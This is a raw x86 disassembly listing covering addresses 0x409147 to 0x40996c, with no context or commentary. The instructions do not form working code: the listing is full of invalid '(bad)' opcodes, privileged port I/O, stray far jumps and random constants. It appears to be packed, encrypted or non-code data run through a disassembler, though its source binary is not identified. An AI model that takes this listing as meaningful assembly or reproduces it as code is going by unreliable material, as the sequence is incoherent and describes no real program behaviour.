  409147:	bound  ebx,QWORD PTR [ebp-0x1beb9215]
  40914d:	dec    edi
  40914e:	inc    eax
  40914f:	lds    ebp,FWORD PTR [ebx-0x4d183989]
  409155:	ds and eax,0xf961f205
  40915b:	cmp    dl,BYTE PTR [edx]
  40915d:	mov    ah,0x78
  40915f:	dec    ebp
  409160:	(bad)  
  409161:	mov    dl,0xa0
  409163:	cmp    BYTE PTR [edi-0x41],bl
  409166:	and    eax,0x6137690f
  40916b:	dec    ebx
  40916c:	dec    esp
  40916d:	mov    esi,0x55fd533
  409172:	out    dx,eax
  409173:	sahf   
  409174:	sub    al,0x6b
  409176:	lea    ecx,[edi-0x55959bf5]
  40917c:	push   edx
  40917d:	xchg   DWORD PTR [ebx-0x3bdb9590],esi
  409183:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409184:	lock jmp 0x1369:0xab39a797
  40918c:	add    esi,ebp
  40918e:	fbld   TBYTE PTR [ecx+eiz*8-0x51]
  409192:	and    BYTE PTR [edi-0x1f0162b],ch
  409198:	je     0x4091b9
  40919a:	scas   eax,DWORD PTR es:[edi]
  40919b:	dec    eax
  40919c:	pop    es
  40919d:	fwait
  40919e:	sbb    al,0x2b
  4091a0:	mov    bl,0x9b
  4091a2:	cmp    edx,DWORD PTR [esi+0x663b549e]
  4091a8:	int3   
  4091a9:	(bad)  
  4091aa:	(bad)  
  4091ac:	and    DWORD PTR [ebx],0x1ce5ae19
  4091b2:	sbb    DWORD PTR [edi+0x4a],0x6078ce64
  4091b9:	push   ebp
  4091ba:	ja     0x409168
  4091bc:	aas    
  4091bd:	sub    edx,DWORD PTR [eax+0x2e]
  4091c0:	out    dx,eax
  4091c1:	stc    
  4091c2:	cmp    DWORD PTR ds:0x6ab34f64,edx
  4091c8:	or     al,0x54
  4091ca:	jg     0x409172
  4091cc:	mov    al,0x18
  4091ce:	push   edi
  4091cf:	inc    esi
  4091d0:	push   eax
  4091d1:	fcom   QWORD PTR [ebx]
  4091d3:	nop
  4091d4:	pop    esi
  4091d5:	mov    esp,0xd8de4e74
  4091da:	sbb    al,0xc1
  4091dc:	or     dl,BYTE PTR [esi+0x59]
  4091df:	int    0x64
  4091e1:	test   eax,0x8d64da42
  4091e6:	pop    edi
  4091e7:	or     al,0xf1
  4091e9:	mov    bl,0x19
  4091eb:	inc    ecx
  4091ec:	(bad)
  4091ef:	int    0x99
  4091f1:	jnp    0x409222
  4091f3:	outs   dx,BYTE PTR ds:[esi]
  4091f4:	add    al,0x5d
  4091f6:	xchg   ecx,eax
  4091f7:	xchg   edi,eax
  4091f8:	fadd   DWORD PTR [ebp+ecx*1+0x207b17d4]
  4091ff:	enter  0x78f1,0xb9
  409203:	push   cs
  409204:	out    dx,eax
  409205:	jmp    DWORD PTR [edi-0x31]
  409208:	leave  
  409209:	(bad)  
  40920a:	jmp    0x409258
  40920c:	pop    edi
  40920d:	popa   
  40920e:	add    esp,esi
  409210:	inc    esp
  409211:	jmp    0xe308:0x6076335d
  409218:	and    esp,DWORD PTR [ebx]
  40921a:	jnp    0x409279
  40921c:	call   0xeffb:0x277c30d3
  409223:	fcom   st(2)
  409225:	push   esp
  409226:	ds daa 
  409228:	and    bl,BYTE PTR [edi-0x2d3b59e3]
  40922e:	push   ecx
  40922f:	sbb    al,0x73
  409231:	sbb    BYTE PTR [edi-0x3899b6d4],dh
  409237:	add    DWORD PTR ds:0xd4ed5fd6,eax
  40923d:	mov    ebx,0x837baf45
  409242:	mov    dh,0x64
  409244:	nop
  409245:	aad    0x6d
  409247:	loop   0x409244
  409249:	dec    esp
  40924a:	add    eax,0xc74b8522
  40924f:	fnstcw WORD PTR [ebx*1-0x7fec335a]
  409256:	out    0x8e,al
  409258:	das    
  409259:	pop    edx
  40925a:	ja     0x409295
  40925c:	mov    cl,0x6e
  40925e:	mov    esi,0x645e2a17
  409263:	mov    dl,BYTE PTR [edx+0x31f9b8a1]
  409269:	mul    DWORD PTR [eax-0x2d]
  40926c:	push   es
  40926d:	sti    
  40926e:	mov    ebx,0x5ebf31fd
  409273:	loopne 0x4092c2
  409275:	dec    esp
  409276:	dec    edi
  409277:	ja     0x4092bc
  409279:	mov    dh,0xf8
  40927b:	sub    esi,0x4c
  40927e:	cmp    edi,ecx
  409280:	xchg   edi,eax
  409281:	add    BYTE PTR [ebx+ebp*2+0x76f3d08a],al
  409288:	add    esi,DWORD PTR [edx+eax*4+0x3a]
  40928c:	cmp    BYTE PTR [edx],ah
  40928e:	data16 aas 
  409290:	fwait
  409291:	xor    edi,edi
  409293:	test   BYTE PTR [ebx+0x2c193ebc],dl
  409299:	push   ecx
  40929a:	sbb    DWORD PTR [ebp+0x4],ecx
  40929d:	mov    dh,ah
  40929f:	mov    dl,0x99
  4092a1:	pop    eax
  4092a2:	in     eax,dx
  4092a3:	ja     0x409282
  4092a5:	lock xchg ebp,eax
  4092a7:	xor    edi,DWORD PTR [eax-0x58]
  4092aa:	mov    ebp,DWORD PTR [ebp-0x5071914e]
  4092b0:	loope  0x4092c7
  4092b2:	pop    ecx
  4092b3:	and    DWORD PTR [esi+0xd],esi
  4092b6:	ret    0x9ade
  4092b9:	outs   dx,DWORD PTR ds:[esi]
  4092ba:	cmp    ebp,esi
  4092bc:	nop
  4092bd:	or     cl,BYTE PTR [esi-0xa]
  4092c0:	push   edi
  4092c1:	aad    0x35
  4092c3:	push   ebp
  4092c4:	shl    BYTE PTR [edx+0x3b38c00c],0x21
  4092cb:	jl     0x409326
  4092cd:	mov    ebp,0x9b63e649
  4092d2:	mov    dl,0xb1
  4092d4:	popf   
  4092d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092d6:	push   edx
  4092d7:	adc    eax,0xc42c94d0
  4092dc:	das    
  4092dd:	(bad)  
  4092de:	mov    edi,fs
  4092e0:	ins    DWORD PTR es:[edi],dx
  4092e1:	sbb    BYTE PTR [ecx-0x2],ch
  4092e4:	push   edx
  4092e5:	and    eax,0x44b67333
  4092ea:	xchg   esp,eax
  4092eb:	push   edx
  4092ec:	js     0x4092c4
  4092ee:	mov    eax,eax
  4092f0:	dec    edx
  4092f1:	scas   eax,DWORD PTR es:[edi]
  4092f2:	or     al,0x9
  4092f4:	cwde   
  4092f5:	sbb    BYTE PTR ds:0xccd0345e,bh
  4092fb:	lods   al,BYTE PTR ds:[esi]
  4092fc:	sahf   
  4092fd:	xchg   edx,eax
  4092fe:	adc    bl,dl
  409300:	jp     0x4092f3
  409302:	jno    0x409356
  409304:	dec    edx
  409305:	mov    esp,0x5352fa1d
  40930a:	xchg   esp,eax
  40930b:	je     0x409374
  40930d:	repz lock les esi,FWORD PTR [di+0x16]
  409313:	int    0xf
  409315:	xchg   esp,eax
  409316:	jns    0x40934b
  409318:	mov    edx,0xae749297
  40931d:	xchg   ebx,eax
  40931e:	xor    DWORD PTR [edi+edi*8-0x62],ebx
  409322:	hlt    
  409323:	jae    0x409390
  409325:	sbb    DWORD PTR [ecx-0x33],edi
  409328:	add    al,0x92
  40932a:	nop
  40932b:	fisttp QWORD PTR ds:0x6ef353e8
  409331:	test   al,0xa2
  409333:	xor    DWORD PTR [edx+eiz*2-0x3a5390c],0xe77a9fdc
  40933e:	ss dec ebp
  409340:	sub    eax,0xa9a04d74
  409345:	daa    
  409346:	sti    
  409347:	fnsave [eax+0x34140a15]
  40934d:	in     al,0x1
  40934f:	test   DWORD PTR [ebx],eax
  409351:	jb     0x40934a
  409353:	inc    eax
  409354:	aam    0xbe
  409356:	add    esi,DWORD PTR [ecx-0x77]
  409359:	shr    DWORD PTR [edx+0x9],1
  40935c:	push   ss
  40935d:	mov    esi,0xb4da5b98
  409362:	sbb    DWORD PTR ds:[ebx+0x3a6cd381],eax
  409369:	xchg   edx,eax
  40936a:	cmp    dh,dl
  40936c:	and    al,BYTE PTR [eax]
  40936e:	inc    edx
  40936f:	mov    esi,0x31b05b07
  409374:	test   DWORD PTR [ebx],edi
  409376:	data16 mov bh,0xd3
  409379:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40937a:	mov    al,0x66
  40937c:	or     BYTE PTR [esi+0x102e3ffb],dh
  409382:	xor    edx,eax
  409384:	inc    eax
  409385:	(bad)  
  409386:	test   eax,0x86c20f6a
  40938b:	add    eax,0x7449ea06
  409390:	test   al,0x27
  409392:	or     eax,0xe37b836
  409397:	mov    ebx,0x5b2090b0
  40939c:	mov    edx,0x550c0379
  4093a1:	sub    DWORD PTR [ebx],edi
  4093a3:	mov    bl,0xbf
  4093a5:	neg    DWORD PTR [edx]
  4093a7:	into   
  4093a8:	fnstsw WORD PTR [ebp+0x48]
  4093ab:	push   0x2098035c
  4093b0:	test   ah,cl
  4093b2:	and    DWORD PTR [ecx],eax
  4093b4:	arpl   WORD PTR [eax+0x4d],dx
  4093b7:	enter  0xd170,0x79
  4093bb:	push   ecx
  4093bc:	fimul  WORD PTR [ebx]
  4093be:	cld    
  4093bf:	jmp    0x4093b1
  4093c1:	xor    eax,0xd939f090
  4093c6:	ins    BYTE PTR es:[edi],dx
  4093c7:	ret    
  4093c8:	cmp    eax,0xb62e234f
  4093cd:	cmp    al,0x14
  4093cf:	shl    BYTE PTR [ecx+0x7c],0x55
  4093d3:	rcl    BYTE PTR [ebp+0x3],0x50
  4093d7:	adc    cl,BYTE PTR [eax+0x3b]
  4093da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093db:	dec    ebx
  4093dc:	xchg   DWORD PTR fs:[eax+0x1c43d62c],edx
  4093e3:	xchg   esp,eax
  4093e4:	mov    edx,0x5dedf9b8
  4093e9:	push   0x5ea8d3bf
  4093ee:	dec    esi
  4093ef:	in     eax,0x1a
  4093f1:	in     al,dx
  4093f2:	popa   
  4093f3:	int3   
  4093f4:	jl     0x409388
  4093f6:	imul   edx,DWORD PTR [esi+ecx*4+0x32a88a2e],0xdb957e8f
  409401:	ins    BYTE PTR es:[edi],dx
  409402:	je     0xd71e0038
  409408:	fdiv   QWORD PTR [edx]
  40940a:	stc    
  40940b:	pushf  
  40940c:	inc    edx
  40940d:	das    
  40940e:	stos   BYTE PTR es:[edi],al
  40940f:	sub    DWORD PTR [ecx+0x8c8b1fa],ebp
  409415:	push   cs
  409416:	add    eax,eax
  409418:	dec    esp
  409419:	push   cs
  40941a:	cmc    
  40941b:	or     al,0x91
  40941d:	dec    esi
  40941e:	mov    eax,ds:0x207b97ed
  409423:	arpl   bp,bp
  409425:	push   ds
  409426:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409427:	leave  
  409428:	dec    esi
  409429:	stc    
  40942a:	xor    edx,DWORD PTR [ecx-0xcd0f3dc]
  409430:	out    0xee,al
  409432:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409433:	pop    ebp
  409434:	data16 fmul st,st(4)
  409437:	add    dl,ah
  409439:	push   0x2e9e4ce5
  40943e:	inc    esi
  40943f:	xchg   esp,eax
  409440:	pushf  
  409441:	add    bh,cl
  409443:	(bad)  
  409444:	sbb    DWORD PTR [ebp+edx*4-0x6ceef799],edi
  40944b:	pop    ebp
  40944c:	or     al,0x5c
  40944e:	imul   esi,DWORD PTR [edx],0x19
  409451:	daa    
  409452:	pop    ss
  409453:	inc    esi
  409454:	test   BYTE PTR [eax],cl
  409456:	das    
  409457:	retf   0xf1e0
  40945a:	call   0x4d5b146d
  40945f:	data16 std 
  409461:	push   es
  409462:	mov    eax,0x489ef3fd
  409467:	and    dl,0xc6
  40946a:	enter  0x178,0xba
  40946e:	xchg   ah,ch
  409470:	ds inc esp
  409472:	xor    edi,eax
  409474:	add    BYTE PTR [edx+0x4b],ah
  409477:	scas   eax,DWORD PTR es:[edi]
  409478:	sbb    eax,0x26906c35
  40947d:	dec    ecx
  40947e:	and    eax,0xc551e3a6
  409483:	push   0x295b705c
  409488:	fsub   QWORD PTR [ecx-0x51]
  40948b:	cdq    
  40948c:	je     0x4094f1
  40948e:	pop    ebx
  40948f:	inc    eax
  409490:	sbb    esp,DWORD PTR [ebx+0x3e306c48]
  409496:	xchg   edx,eax
  409497:	in     eax,dx
  409498:	add    dh,BYTE PTR [esi+0x6739ac21]
  40949e:	dec    ebp
  40949f:	lds    eax,FWORD PTR [esp+ebp*1-0x5a7f3a1]
  4094a6:	add    BYTE PTR [ecx+0x434e7cb1],0xf0
  4094ad:	std    
  4094ae:	inc    eax
  4094af:	adc    BYTE PTR [ebx],ah
  4094b1:	push   ds
  4094b2:	loop   0x4094d7
  4094b4:	inc    ecx
  4094b5:	mov    eax,0x2438807f
  4094ba:	mov    cl,0xd0
  4094bc:	(bad)
  4094bf:	dec    edi
  4094c0:	pop    edx
  4094c1:	dec    esi
  4094c2:	sar    ebp,1
  4094c4:	mov    esi,DWORD PTR [ecx-0xb]
  4094c7:	sub    al,0xfd
  4094c9:	fsubr  QWORD PTR [eax-0x4f81299d]
  4094cf:	jp     0x4094e1
  4094d1:	push   esp
  4094d2:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094d4:	add    al,0x91
  4094d6:	(bad)  
  4094d8:	retf   0x67d3
  4094db:	mov    ebp,0x83ae0bf4
  4094e0:	test   BYTE PTR [edi-0x49],dl
  4094e3:	cmp    ecx,DWORD PTR [edx+ebx*4+0x3d]
  4094e7:	xchg   ebx,eax
  4094e8:	inc    edi
  4094e9:	dec    eax
  4094ea:	cdq    
  4094eb:	mov    bh,0x45
  4094ed:	(bad)  
  4094ee:	jno    0x4094be
  4094f0:	cmp    BYTE PTR [ebx],ch
  4094f2:	mov    dl,0x21
  4094f4:	adc    al,0xb1
  4094f6:	pop    eax
  4094f7:	fisttp WORD PTR [ebp-0x28950e10]
  4094fd:	cmp    al,BYTE PTR [eax-0x5015e9fa]
  409503:	lods   eax,DWORD PTR ds:[esi]
  409504:	pop    edi
  409505:	mov    edx,0x6353c9e4
  40950a:	dec    esp
  40950b:	jae    0x4094e0
  40950d:	sti    
  40950e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40950f:	imul   edx,esp,0x5968347c
  409515:	cwde   
  409516:	fisttp QWORD PTR [edx]
  409518:	bound  ebx,QWORD PTR [ecx]
  40951a:	cmp    dl,BYTE PTR [edx+0x30452160]
  409520:	gs (bad) 
  409522:	fucomip st,st(4)
  409524:	repnz ins DWORD PTR es:[edi],dx
  409526:	sub    BYTE PTR [eax+0x44c1969a],dh
  40952c:	mov    cs,WORD PTR [ecx]
  40952e:	and    edi,ecx
  409530:	shl    BYTE PTR [esi+0x4f3f2958],1
  409536:	aam    0x7c
  409538:	inc    edx
  409539:	push   esi
  40953a:	in     eax,0xe8
  40953c:	cmp    eax,0x9e081a3f
  409541:	leave  
  409542:	dec    esp
  409543:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409544:	adc    eax,0x65d9a04e
  409549:	outs   dx,DWORD PTR ds:[esi]
  40954a:	sahf   
  40954b:	cmp    dl,BYTE PTR [eax]
  40954d:	or     edx,DWORD PTR [edi+0x7679791c]
  409553:	sub    BYTE PTR [edi],dh
  409555:	popa   
  409556:	xchg   edi,eax
  409557:	and    DWORD PTR ds:0x8df6a432,eax
  40955d:	call   0xe9a8:0x1452ecf6
  409564:	adc    ebp,DWORD PTR [ebx-0x19]
  409567:	sub    BYTE PTR [eax-0x2fe9be31],dh
  40956d:	xchg   edx,eax
  40956e:	xlat   BYTE PTR ds:[ebx]
  40956f:	xchg   esp,eax
  409570:	jae    0x409515
  409572:	fadd   st(7),st
  409574:	fcom   DWORD PTR [esi+0x3bfb9390]
  40957a:	dec    ecx
  40957b:	xchg   esp,eax
  40957c:	cli    
  40957d:	repz pop eax
  40957f:	mov    BYTE PTR ds:0x2e313837,bh
  409585:	inc    eax
  409586:	or     eax,0x11403544
  40958b:	sar    DWORD PTR [eax-0x2e308c44],1
  409591:	retf   0x878e
  409594:	mov    esi,0xa0e8261
  409599:	and    esi,ebx
  40959b:	push   cs
  40959c:	addr16 jne 0x409538
  40959f:	addr16 jp 0x409621
  4095a2:	mov    eax,ds:0x686c5a99
  4095a7:	push   edx
  4095a8:	push   edx
  4095a9:	mov    ds:0xe391a238,eax
  4095ae:	loop   0x4095e0
  4095b0:	sti    
  4095b1:	sahf   
  4095b2:	aam    0x29
  4095b4:	dec    edi
  4095b5:	ins    DWORD PTR es:[edi],dx
  4095b6:	daa    
  4095b7:	test   al,0x4a
  4095b9:	push   esp
  4095ba:	jo     0x409589
  4095bc:	jo     0x409633
  4095be:	pop    ds
  4095bf:	cdq    
  4095c0:	fwait
  4095c1:	or     DWORD PTR [edx+0x64],0x5fcce410
  4095c8:	fstp   QWORD PTR [edi-0x5d]
  4095cb:	jmp    0xf2c6f5cc
  4095d0:	scas   al,BYTE PTR es:[edi]
  4095d1:	add    eax,0x63589184
  4095d6:	sub    BYTE PTR [eax],0xc
  4095d9:	cmp    edx,DWORD PTR [ecx-0x26d2adc5]
  4095df:	xchg   BYTE PTR [eax],bh
  4095e1:	xchg   ecx,eax
  4095e2:	in     al,dx
  4095e3:	adc    dh,BYTE PTR fs:[esi+0x63]
  4095e7:	into   
  4095e8:	mov    ecx,0xd4c1e55a
  4095ed:	je     0x40957e
  4095ef:	cld    
  4095f0:	sti    
  4095f1:	into   
  4095f2:	xor    eax,0x88be9248
  4095f7:	cmp    DWORD PTR [edx+0x3efcc9f8],0xffffffc4
  4095fe:	aaa    
  4095ff:	(bad)
  409603:	jl     0x4095d2
  409605:	mov    dh,0xc
  409607:	fbstp  TBYTE PTR [eax+0x56]
  40960a:	jae    0x40965d
  40960c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40960d:	and    eax,0xca29d1
  409612:	mov    ds:0x825b5d1b,eax
  409617:	fwait
  409618:	adc    BYTE PTR [edi-0x53483579],bh
  40961e:	cmp    eax,0x5fd3b271
  409623:	mov    ebp,0x5dfe3683
  409628:	fnstsw WORD PTR [edi-0x47]
  40962b:	mov    dl,0x32
  40962d:	lods   eax,DWORD PTR ds:[esi]
  40962e:	loope  0x409631
  409630:	(bad)  
  409631:	loopne 0x409609
  409633:	adc    ecx,edx
  409635:	xor    ecx,DWORD PTR [eax+0x49]
  409638:	or     DWORD PTR [esi+0x3c5f2091],edx
  40963e:	mov    dl,ch
  409640:	or     DWORD PTR [edi-0x87b7f89],0x4f
  409647:	mov    ebp,0x85daeb3f
  40964c:	test   eax,0x35940a32
  409651:	or     ah,cl
  409653:	mov    bh,0x8f
  409655:	pop    ecx
  409656:	sbb    esi,DWORD PTR ds:0x7a810b5b
  40965c:	nop
  40965d:	fimul  WORD PTR [edi-0x9]
  409660:	mov    edi,0xc345c491
  409665:	fisubr WORD PTR [edi+0x2f627400]
  40966b:	add    al,0xe3
  40966d:	push   es
  40966e:	int3   
  40966f:	and    BYTE PTR [edi+edi*1],bl
  409672:	mov    bh,0xe6
  409674:	or     bh,BYTE PTR [ecx]
  409676:	fisttp DWORD PTR [edx]
  409678:	gs jno 0x409649
  40967b:	jmp    DWORD PTR [edx+0x560892ad]
  409681:	shl    BYTE PTR [edx-0x6c348564],0xa7
  409688:	std    
  409689:	clc    
  40968a:	xchg   edi,eax
  40968b:	data16 loop 0x409678
  40968e:	(bad)  
  40968f:	iret   
  409690:	cmp    al,0xa8
  409692:	push   ss
  409693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409694:	and    BYTE PTR [eax],dl
  409696:	in     al,0xdc
  409698:	inc    ebp
  409699:	sbb    bh,dh
  40969b:	sbb    esp,DWORD PTR [esi-0xd4e9e00]
  4096a1:	xchg   esp,eax
  4096a2:	ror    DWORD PTR [ebx+0x69c27165],cl
  4096a8:	jo     0x4096e6
  4096aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096ab:	cdq    
  4096ac:	xchg   esi,eax
  4096ad:	sbb    ah,BYTE PTR [esi-0x18]
  4096b0:	outs   dx,BYTE PTR ds:[esi]
  4096b1:	gs loop 0x409636
  4096b4:	xchg   ebx,eax
  4096b5:	sub    DWORD PTR ds:0x103f754f,ebx
  4096bb:	and    eax,DWORD PTR [edi]
  4096bd:	xchg   ecx,eax
  4096be:	adc    ah,cl
  4096c0:	pop    ss
  4096c1:	mov    edx,0x575d9731
  4096c6:	push   ds
  4096c7:	hlt    
  4096c8:	call   0xcbba931b
  4096cd:	xchg   DWORD PTR [ecx-0x71477906],ecx
  4096d3:	jge    0x4096f1
  4096d5:	sbb    BYTE PTR [ecx-0x1f11600],cl
  4096db:	xchg   DWORD PTR [eax],edx
  4096dd:	xchg   ebp,eax
  4096de:	fxch   st(7)
  4096e0:	or     eax,0x46809daf
  4096e5:	add    eax,0xc1d182ff
  4096ea:	mov    dl,0xc2
  4096ec:	outs   dx,DWORD PTR ds:[esi]
  4096ed:	inc    ebx
  4096ee:	mov    dh,0x33
  4096f0:	xchg   ecx,eax
  4096f1:	mov    esi,0xdea36b2d
  4096f6:	or     al,0x9a
  4096f8:	and    al,0xd6
  4096fa:	push   esp
  4096fc:	add    edi,DWORD PTR [eax]
  4096fe:	les    ebx,FWORD PTR [ecx-0x703af269]
  409704:	and    al,0xca
  409706:	sbb    DWORD PTR [eax+0x74fd59e6],edx
  40970c:	mov    ebp,0xa76b7afa
  409711:	jne    0x409778
  409713:	(bad)  
  409714:	call   0x4ae2:0x3032f908
  40971b:	sahf   
  40971c:	mov    edx,0x6149933
  409721:	scas   al,BYTE PTR es:[edi]
  409722:	mov    bl,BYTE PTR [ebp-0x73db0d7f]
  409728:	data16 repnz icebp 
  40972b:	mov    BYTE PTR [eax-0x6b],dh
  40972e:	jg     0x409749
  409730:	(bad)  
  409731:	repnz or DWORD PTR [edi-0x379a671f],eax
  409738:	std    
  409739:	cwde   
  40973a:	jne    0x40979a
  40973c:	scas   al,BYTE PTR es:[edi]
  40973d:	xchg   ebp,eax
  40973e:	lods   eax,DWORD PTR ds:[esi]
  40973f:	sti    
  409740:	pop    edx
  409741:	lahf   
  409742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409743:	sbb    edx,DWORD PTR [ecx+0x21282f3]
  409749:	dec    ecx
  40974a:	pop    es
  40974b:	ror    BYTE PTR [esi-0x5be57c0e],cl
  409751:	sub    al,0xea
  409753:	and    eax,0xf49820b7
  409758:	and    BYTE PTR [edi-0x15],dh
  40975b:	not    ebp
  40975d:	ret    
  40975e:	fdivr  st(4),st
  409760:	dec    esi
  409761:	test   eax,0x9638f301
  409766:	and    eax,0x9719d335
  40976b:	loopne 0x4097cf
  40976d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40976e:	sahf   
  40976f:	or     bl,ah
  409771:	fcom   DWORD PTR [esi]
  409773:	xchg   ecx,eax
  409774:	xor    BYTE PTR [eax-0x7ad439dd],dl
  40977a:	sti    
  40977b:	dec    eax
  40977c:	retf   
  40977d:	mov    esp,0xaf752563
  409782:	aad    0x37
  409784:	ror    esp,1
  409786:	xchg   DWORD PTR [ecx+0x66],ebp
  409789:	mov    al,0x5f
  40978c:	jmp    0x236f634a
  409791:	addr16 cld 
  409793:	jge    0x409717
  409795:	fdivr  DWORD PTR [ecx-0x6315b52e]
  40979b:	in     eax,dx
  40979c:	ror    BYTE PTR [ebp-0x5dd1577],0x14
  4097a3:	dec    esp
  4097a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097a5:	js     0x70ccc099
  4097ab:	outs   dx,DWORD PTR ds:[esi]
  4097ac:	inc    esi
  4097ad:	mov    esi,0xd2bad696
  4097b2:	aaa    
  4097b3:	aas    
  4097b4:	push   esp
  4097b5:	mov    esp,0xf888ad0d
  4097ba:	or     ebp,DWORD PTR ds:0xe9202538
  4097c0:	rol    BYTE PTR [ebp-0x8],1
  4097c3:	push   ebp
  4097c4:	pop    ecx
  4097c5:	lahf   
  4097c6:	sub    eax,0x3547c05c
  4097cb:	xchg   edi,eax
  4097cc:	xchg   ecx,eax
  4097cd:	sti    
  4097ce:	mov    ds:0xb6fd15cb,al
  4097d3:	sub    BYTE PTR [ebp-0x6],0x9c
  4097d7:	loope  0x40984d
  4097d9:	jl     0x40977f
  4097db:	in     al,dx
  4097dc:	ror    DWORD PTR [ecx+eiz*2+0xa],0x41
  4097e1:	loopne 0x40976a
  4097e3:	xchg   ecx,eax
  4097e4:	pushf  
  4097e5:	jl     0x4097a3
  4097e7:	shr    bl,1
  4097e9:	mov    ?,WORD PTR [edx]
  4097eb:	or     al,0xa6
  4097ed:	out    0x72,eax
  4097ef:	loope  0x409774
  4097f1:	adc    eax,0x2f2cca6b
  4097f6:	jnp    0x4097d3
  4097f8:	add    eax,0x3ee55b8a
  4097fd:	inc    esp
  4097fe:	xchg   DWORD PTR [edi+ebp*1+0x58bf2dcd],edx
  409805:	fnstcw WORD PTR ds:[ecx-0x108b080a]
  40980c:	add    DWORD PTR [edi],eax
  40980e:	mov    eax,ds:0x43a779f3
  409813:	fcmove st,st(0)
  409815:	(bad)  
  409816:	(bad)  
  409818:	sbb    ebx,DWORD PTR [ebx+eax*1+0x7b]
  40981c:	dec    ecx
  40981d:	mov    al,dh
  40981f:	mov    BYTE PTR ds:[ecx+0x67],0x4a
  409824:	ds push ss
  409826:	push   0xc7acd7bb
  40982b:	ret    
  40982c:	cld    
  40982d:	test   DWORD PTR [ebx+0x286c4817],0x25fed67a
  409837:	mov    cl,0x7e
  409839:	push   ss
  40983a:	out    0x20,al
  40983c:	sahf   
  40983d:	jne    0x40980e
  40983f:	adc    eax,DWORD PTR [esp+edi*8]
  409842:	in     eax,dx
  409843:	mov    ebx,0x68ea108f
  409848:	xchg   ebp,eax
  409849:	mov    ch,BYTE PTR [ebx]
  40984b:	jmp    0x9d67250b
  409850:	jb     0x409849
  409852:	fcom   QWORD PTR [ebp+0x1c67d6bf]
  409858:	jmp    0xdc5b:0x3a9c05ff
  40985f:	xor    eax,0x869bf6b0
  409864:	lds    esp,FWORD PTR fs:[ebx-0x4230c23d]
  40986b:	sbb    DWORD PTR [eax],0x61
  40986e:	sbb    eax,DWORD PTR [esi+0x6e]
  409871:	pushf  
  409872:	jecxz  0x4098d3
  409874:	inc    ebx
  409875:	leave  
  409876:	sar    DWORD PTR [ebx+0x6f],cl
  409879:	cmp    ch,ah
  40987b:	dec    ecx
  40987c:	sub    BYTE PTR [ebp-0x2bafb6ad],dh
  409882:	pop    es
  409883:	sub    BYTE PTR [esi+esi*1+0x8365f97],ah
  40988a:	push   eax
  40988b:	pop    ebx
  40988c:	lods   al,BYTE PTR ds:[esi]
  40988d:	rol    BYTE PTR [eax-0x7e],1
  409890:	jl     0x4098bc
  409892:	dec    esp
  409893:	pop    edi
  409894:	loop   0x40987c
  409896:	stc    
  409897:	mov    edi,0xc6e3ea58
  40989c:	inc    ebx
  40989d:	cmc    
  40989e:	xor    eax,0xf15f602d
  4098a3:	or     al,0x25
  4098a5:	popa   
  4098a6:	push   ebp
  4098a7:	cmc    
  4098a8:	outs   dx,DWORD PTR ds:[esi]
  4098a9:	mov    eax,es
  4098ab:	adc    eax,0xfe63886d
  4098b0:	cmp    ebx,edi
  4098b2:	pop    ds
  4098b3:	mov    cl,0xba
  4098b5:	pop    edi
  4098b6:	add    al,dh
  4098b8:	jmp    0xefa76404
  4098bd:	sbb    al,0x2e
  4098bf:	scas   al,BYTE PTR es:[edi]
  4098c0:	(bad)  
  4098c1:	je     0x4098b9
  4098c3:	cmp    eax,0xff273afc
  4098c8:	sub    eax,0xd40d5a12
  4098cd:	xchg   BYTE PTR ds:0x16069ff7,ah
  4098d3:	sub    eax,DWORD PTR [esi]
  4098d5:	cmp    eax,0x6edc72d9
  4098da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098db:	pop    eax
  4098dc:	xchg   esp,eax
  4098dd:	test   BYTE PTR [edi+0x37813e64],dl
  4098e3:	inc    ebp
  4098e4:	sub    ebx,0x12ca5fc6
  4098ea:	dec    esi
  4098eb:	ins    DWORD PTR es:[edi],dx
  4098ec:	push   0x6e754aba
  4098f1:	(bad)  
  4098f2:	push   0xfa823818
  4098f7:	es inc ecx
  4098f9:	xchg   ecx,eax
  4098fa:	xchg   edx,eax
  4098fb:	out    dx,eax
  4098fc:	xchg   ecx,eax
  4098fd:	dec    edi
  4098fe:	fiadd  WORD PTR [esp+ecx*1-0x1c1834ee]
  409905:	fwait
  409906:	sub    BYTE PTR [eax-0x53],ch
  409909:	mov    ds:0x9af1b7b8,al
  40990e:	inc    edi
  40990f:	lahf   
  409910:	cmp    esi,ebx
  409912:	aaa    
  409913:	aam    0xfc
  409915:	test   BYTE PTR [ecx-0x3eda189],dl
  40991b:	mov    esi,0x65dd1c0f
  409920:	popa   
  409921:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409922:	clc    
  409923:	in     al,dx
  409924:	mov    eax,0xed24923e
  409929:	jge    0x4098ed
  40992b:	lahf   
  40992c:	(bad)  
  40992d:	dec    esi
  40992e:	call   0x5509:0x8fb760d5
  409935:	jmp    0x270ade3d
  40993a:	inc    ecx
  40993b:	xor    edx,esi
  40993d:	mov    cs,WORD PTR [edi]
  40993f:	xor    eax,eax
  409941:	in     al,0xed
  409943:	xor    BYTE PTR [esi-0x4a9b5790],dh
  409949:	or     eax,edi
  40994b:	or     DWORD PTR [ebx+0x75a31299],eax
  409951:	sbb    al,0x73
  409953:	nop
  409954:	enter  0xc365,0x28
  409958:	xor    edx,edi
  40995a:	mov    edx,0x3e70cc11
  40995f:	pop    ebx
  409960:	mov    WORD PTR [eax+0x420d575e],gs
  409966:	pop    esp
  409967:	pop    edx
  409968:	xor    edx,DWORD PTR [ebp+0x4e]
  40996b:	pop    ecx
  40996c:	outs   dx,BYTE PTR ds:[esi]
